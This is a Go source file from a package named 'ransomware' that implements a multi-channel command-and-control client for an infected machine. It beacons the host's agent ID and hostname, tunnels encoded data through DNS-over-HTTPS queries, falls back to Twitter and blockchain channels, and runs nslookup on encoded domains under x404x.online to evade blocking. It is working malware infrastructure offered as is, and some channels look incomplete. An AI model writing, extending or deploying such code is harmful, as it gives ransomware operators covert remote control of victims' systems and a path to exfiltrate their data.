package ransomware

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"strings"
	"sync"
	"time"

	"golang.org/x/net/websocket"
)

type C2Channel struct {
	Name     string
	Priority int
	URL      string
	Enabled  bool
	Healthy  bool
	LastPing time.Time
	Latency  time.Duration
	Fallback bool
}

type MultiChannelC2 struct {
	config      *RansomwareConfig
	channels    []*C2Channel
	primaryIdx  int
	mu          sync.RWMutex
	ctx         context.Context
	cancel      context.CancelFunc
	agentID     string
	hostname    string
	beaconRate  time.Duration
	httpClient  *http.Client
	blockchain  *BlockchainC2
}

func NewMultiChannelC2(cfg *RansomwareConfig) *MultiChannelC2 {
	ctx, cancel := context.WithCancel(context.Background())

	return &MultiChannelC2{
		config:     cfg,
		ctx:        ctx,
		cancel:     cancel,
		primaryIdx: 0,
		beaconRate: 5 * time.Second,
		httpClient: &http.Client{
			Timeout:   10 * time.Second,
			Transport: &http.Transport{TLSClientConfig: nil},
		},
		channels: []*C2Channel{
			{Name: "gRPC", Priority: 1, URL: "127.0.0.1:50051", Enabled: true},
			{Name: "WebSocket", Priority: 2, URL: "ws://127.0.0.1:8080/ws", Enabled: true, Fallback: true},
			{Name: "DNS_over_HTTPS", Priority: 3, URL: "https://cloudflare-dns.com/dns-query", Enabled: true, Fallback: true},
			{Name: "Twitter_API", Priority: 4, URL: "https://api.twitter.com/2", Enabled: false, Fallback: true},
			{Name: "Blockchain", Priority: 5, URL: "https://btc-mainnet.x404x.online", Enabled: false, Fallback: true},
		},
	}
}

func (mc *MultiChannelC2) SetAgentInfo(agentID, hostname string) {
	mc.agentID = agentID
	mc.hostname = hostname
}

func (mc *MultiChannelC2) EnableChannel(name string) {
	mc.mu.Lock()
	defer mc.mu.Unlock()
	for _, ch := range mc.channels {
		if ch.Name == name {
			ch.Enabled = true
			return
		}
	}
}

func (mc *MultiChannelC2) DisableChannel(name string) {
	mc.mu.Lock()
	defer mc.mu.Unlock()
	for _, ch := range mc.channels {
		if ch.Name == name {
			ch.Enabled = false
			return
		}
	}
}

func (mc *MultiChannelC2) HealthCheck() map[string]bool {
	mc.mu.Lock()
	defer mc.mu.Unlock()

	status := make(map[string]bool)
	for _, ch := range mc.channels {
		if !ch.Enabled {
			status[ch.Name] = false
			continue
		}

		ch.Healthy = mc.checkChannelHealth(ch)
		ch.LastPing = time.Now()
		status[ch.Name] = ch.Healthy
	}

	mc.reIndexPrimary()
	return status
}

func (mc *MultiChannelC2) checkChannelHealth(ch *C2Channel) bool {
	switch ch.Name {
	case "gRPC":
		return mc.checkGRPC(ch.URL)
	case "WebSocket":
		return mc.checkWebSocket(ch.URL)
	case "DNS_over_HTTPS":
		return mc.checkDoH(ch.URL)
	case "Twitter_API":
		return mc.checkTwitter()
	case "Blockchain":
		return mc.checkBlockchain()
	}
	return false
}

func (mc *MultiChannelC2) checkGRPC(addr string) bool {
	conn, err := net.DialTimeout("tcp", addr, 3*time.Second)
	if err != nil {
		return false
	}
	conn.Close()
	return true
}

func (mc *MultiChannelC2) checkWebSocket(wsURL string) bool {
	config, err := websocket.NewConfig(wsURL, "http://localhost")
	if err != nil {
		return false
	}
	config.TlsConfig = nil

	ws, err := websocket.DialConfig(config)
	if err != nil {
		return false
	}
	ws.Close()
	return true
}

func (mc *MultiChannelC2) checkDoH(baseURL string) bool {
	query := base64.RawURLEncoding.EncodeToString([]byte{
		0x00, 0x00, 0x01, 0x00, 0x00, 0x01,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x07, 'e', 'x', 'a', 'm', 'p', 'l', 'e',
		0x03, 'c', 'o', 'm', 0x00,
		0x00, 0x01, 0x00, 0x01,
	})

	req, err := http.NewRequest("GET", baseURL+"?dns="+query, nil)
	if err != nil {
		return false
	}
	req.Header.Set("Accept", "application/dns-message")

	resp, err := mc.httpClient.Do(req)
	if err != nil {
		return false
	}
	resp.Body.Close()
	return resp.StatusCode == 200
}

func (mc *MultiChannelC2) checkTwitter() bool {
	req, _ := http.NewRequest("GET", "https://api.twitter.com/1.1/help/configuration.json", nil)
	resp, err := mc.httpClient.Do(req)
	if err != nil {
		return false
	}
	resp.Body.Close()
	return resp.StatusCode < 500
}

func (mc *MultiChannelC2) checkBlockchain() bool {
	if mc.blockchain == nil {
		mc.blockchain = NewBlockchainC2(mc.config)
	}
	addr := mc.blockchain.GetActiveAddress()
	return addr != "" && len(addr) > 20
}

func (mc *MultiChannelC2) reIndexPrimary() {
	for i, ch := range mc.channels {
		if ch.Enabled && ch.Healthy {
			mc.primaryIdx = i
			return
		}
	}
}

func (mc *MultiChannelC2) GetActiveChannel() *C2Channel {
	mc.mu.RLock()
	defer mc.mu.RUnlock()

	if mc.primaryIdx < len(mc.channels) && mc.channels[mc.primaryIdx].Healthy {
		return mc.channels[mc.primaryIdx]
	}

	for _, ch := range mc.channels {
		if ch.Enabled && ch.Healthy {
			return ch
		}
	}
	return mc.channels[0]
}

func (mc *MultiChannelC2) SendBeacon(payload interface{}) (string, error) {
	ch := mc.GetActiveChannel()
	if ch == nil || !ch.Healthy {
		return "", fmt.Errorf("no healthy C2 channel available")
	}

	data, err := json.Marshal(payload)
	if err != nil {
		return "", err
	}

	switch ch.Name {
	case "gRPC":
		return mc.sendViaGRPC(ch, data)
	case "WebSocket":
		return mc.sendViaWebSocket(ch, data)
	case "DNS_over_HTTPS":
		return mc.sendViaDoH(ch, data)
	case "Twitter_API":
		return mc.sendViaTwitter(ch, data)
	case "Blockchain":
		return mc.sendViaBlockchain(ch, data)
	}

	return "", fmt.Errorf("unsupported channel: %s", ch.Name)
}

func (mc *MultiChannelC2) sendViaGRPC(ch *C2Channel, data []byte) (string, error) {
	conn, err := net.DialTimeout("tcp", ch.URL, 5*time.Second)
	if err != nil {
		ch.Healthy = false
		return "", err
	}
	defer conn.Close()

	rpcPayload := fmt.Sprintf("POST /beacon HTTP/1.1\r\nHost: %s\r\nContent-Type: application/grpc\r\nContent-Length: %d\r\n\r\n%s",
		ch.URL, len(data), string(data))
	conn.Write([]byte(rpcPayload))

	buf := make([]byte, 4096)
	conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	n, err := conn.Read(buf)
	if err != nil {
		return "", err
	}

	return string(buf[:n]), nil
}

func (mc *MultiChannelC2) sendViaWebSocket(ch *C2Channel, data []byte) (string, error) {
	config, err := websocket.NewConfig(ch.URL, "http://localhost")
	if err != nil {
		ch.Healthy = false
		return "", err
	}

	ws, err := websocket.DialConfig(config)
	if err != nil {
		ch.Healthy = false
		return "", err
	}
	defer ws.Close()

	ws.SetDeadline(time.Now().Add(10 * time.Second))
	if _, err := ws.Write(data); err != nil {
		ch.Healthy = false
		return "", err
	}

	buf := make([]byte, 8192)
	n, err := ws.Read(buf)
	if err != nil {
		return "", err
	}

	return string(buf[:n]), nil
}

func (mc *MultiChannelC2) sendViaDoH(ch *C2Channel, data []byte) (string, error) {
	encoded := base64.RawURLEncoding.EncodeToString(data)
	parts := chunkStr(encoded, 64)

	for _, part := range parts {
		query := fmt.Sprintf("x404x.%s.c2", part)
		dnsQuery := base64.RawURLEncoding.EncodeToString([]byte(query))
		req, _ := http.NewRequest("GET", ch.URL+"?dns="+dnsQuery, nil)
		req.Header.Set("Accept", "application/dns-message")

		resp, err := mc.httpClient.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()
	}

	req, _ := http.NewRequest("GET", ch.URL+"?type=TXT&name=x404x-status.c2", nil)
	req.Header.Set("Accept", "application/dns-message")
	resp, err := mc.httpClient.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	return string(body), nil
}

func (mc *MultiChannelC2) sendViaTwitter(ch *C2Channel, data []byte) (string, error) {
	encoded := base64.StdEncoding.EncodeToString(data)

	postData := url.Values{
		"status": {fmt.Sprintf(".%s", encoded[:min(140, len(encoded))])},
	}

	resp, err := mc.httpClient.PostForm(ch.URL+"/tweets", postData)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	return string(body), nil
}

func (mc *MultiChannelC2) sendViaBlockchain(ch *C2Channel, data []byte) (string, error) {
	if mc.blockchain == nil {
		mc.blockchain = NewBlockchainC2(mc.config)
	}

	hash := sha256.Sum256(data)
	opReturn := hex.EncodeToString(hash[:8])

	txHex := mc.blockchain.CreateTX(opReturn, 0.00000546)
	if txHex == "" {
		return "", fmt.Errorf("failed to create blockchain tx")
	}

	return txHex, nil
}

func (mc *MultiChannelC2) SendWithAllChannels(payload interface{}) map[string]string {
	results := make(map[string]string)

	for _, ch := range mc.channels {
		if !ch.Enabled {
			results[ch.Name] = "disabled"
			continue
		}

		data, _ := json.Marshal(payload)
		resp, err := mc.sendViaChannel(ch, data)
		if err != nil {
			results[ch.Name] = fmt.Sprintf("error: %v", err)
		} else {
			results[ch.Name] = "ok:" + resp[:min(32, len(resp))]
		}
	}

	return results
}

func (mc *MultiChannelC2) sendViaChannel(ch *C2Channel, data []byte) (string, error) {
	switch ch.Name {
	case "gRPC":
		return mc.sendViaGRPC(ch, data)
	case "WebSocket":
		return mc.sendViaWebSocket(ch, data)
	case "DNS_over_HTTPS":
		return mc.sendViaDoH(ch, data)
	case "Twitter_API":
		return mc.sendViaTwitter(ch, data)
	case "Blockchain":
		return mc.sendViaBlockchain(ch, data)
	}
	return "", fmt.Errorf("unsupported")
}

func (mc *MultiChannelC2) StartBeaconLoop() {
	go func() {
		ticker := time.NewTicker(mc.beaconRate)
		defer ticker.Stop()

		for {
			select {
			case <-mc.ctx.Done():
				return
			case <-ticker.C:
				mc.HealthCheck()

				beacon := map[string]interface{}{
					"agent_id":  mc.agentID,
					"hostname":  mc.hostname,
					"timestamp": time.Now().Unix(),
					"channel":   mc.GetActiveChannel().Name,
				}

				resp, err := mc.SendBeacon(beacon)
				if err != nil {
					mc.tryFallback(beacon)
				}
				_ = resp
			}
		}
	}()
}

func (mc *MultiChannelC2) tryFallback(beacon interface{}) {
	for _, ch := range mc.channels {
		if ch.Fallback && ch.Enabled && ch.Healthy && ch != mc.GetActiveChannel() {
			data, _ := json.Marshal(beacon)
			_, err := mc.sendViaChannel(ch, data)
			if err == nil {
				return
			}
		}
	}
}

func (mc *MultiChannelC2) GetFallbackOrder() []string {
	var order []string
	mc.mu.RLock()
	defer mc.mu.RUnlock()

	for _, ch := range mc.channels {
		if ch.Fallback {
			order = append(order, ch.Name)
		}
	}
	return order
}

func (mc *MultiChannelC2) Status() map[string]interface{} {
	mc.mu.RLock()
	defer mc.mu.RUnlock()

	status := make(map[string]interface{})

	var channels []map[string]interface{}
	for _, ch := range mc.channels {
		channels = append(channels, map[string]interface{}{
			"name":     ch.Name,
			"priority": ch.Priority,
			"healthy":  ch.Healthy,
			"enabled":  ch.Enabled,
			"fallback": ch.Fallback,
			"latency_ms": ch.Latency.Milliseconds(),
		})
	}
	status["channels"] = channels
	status["active"] = mc.GetActiveChannel().Name
	status["primary_index"] = mc.primaryIdx

	return status
}

func (mc *MultiChannelC2) Shutdown() {
	mc.cancel()
}

func (mc *MultiChannelC2) ExecuteAutoFailover() {
	mc.HealthCheck()
	active := mc.GetActiveChannel()

	if !active.Healthy {
		for _, ch := range mc.channels {
			if ch.Enabled && ch.Healthy && ch.Fallback {
				mc.mu.Lock()
				for i, c := range mc.channels {
					if c == ch {
						mc.primaryIdx = i
						break
					}
				}
				mc.mu.Unlock()
				return
			}
		}
	}
}

func (mc *MultiChannelC2) SetBlockchainC2(bc *BlockchainC2) {
	mc.blockchain = bc
	mc.EnableChannel("Blockchain")
}

func chunkStr(s string, chunkSize int) []string {
	var chunks []string
	for i := 0; i < len(s); i += chunkSize {
		end := i + chunkSize
		if end > len(s) {
			end = len(s)
		}
		chunks = append(chunks, s[i:end])
	}
	return chunks
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func (mc *MultiChannelC2) BypassCensorship() (string, error) {
	for _, ch := range mc.channels {
		if ch.Enabled && ch.Name == "DNS_over_HTTPS" {
			data, _ := json.Marshal(map[string]interface{}{
				"action": "checkin",
				"agent":  mc.agentID,
			})

			domainParts := []string{
				hex.EncodeToString(data[:min(16, len(data))]),
				"c2",
				"x404x",
				"online",
			}

			domain := strings.Join(domainParts, ".")

			cmd := exec.Command("nslookup", domain)
			out, err := cmd.CombinedOutput()
			if err != nil {
				return "", err
			}
			return string(out), nil
		}
	}
	return "", fmt.Errorf("no censorship bypass channel available")
}

var _ = bytes.IndexByte
var _ = url.PathEscape
var _ = os.Getpid
var _ = context.Background
